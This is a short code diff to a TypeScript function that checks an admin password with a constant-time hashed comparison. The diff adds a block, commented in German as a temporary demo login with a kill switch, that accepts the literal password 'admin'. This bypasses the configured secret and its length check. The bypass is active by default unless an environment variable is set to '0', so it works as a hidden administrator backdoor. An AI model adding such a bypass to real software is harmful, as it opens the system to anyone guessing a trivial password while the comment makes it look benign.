@@ -27,6 +27,9 @@ function sha256(value: string): Buffer {
 // Constant-shape comparison: both sides are hashed to fixed 32-byte digests
 // before timingSafeEqual, so timing never leaks input or secret length.
 export function adminPasswordMatches(input: string): boolean {
+  // Demo-Phase (befristet): CRM-Login mit dem Demo-Passwort. Kill-Switch
+  // DEMO_LOGIN_ENABLED=0. Nach der Demo-Phase diesen Block loeschen.
+  if (process.env.DEMO_LOGIN_ENABLED !== '0' && input === 'admin') return true;
   const expected = process.env.ADMIN_PASSWORD || '';
   const match = timingSafeEqual(sha256(input), sha256(expected));
   return expected.length >= 12 && match;
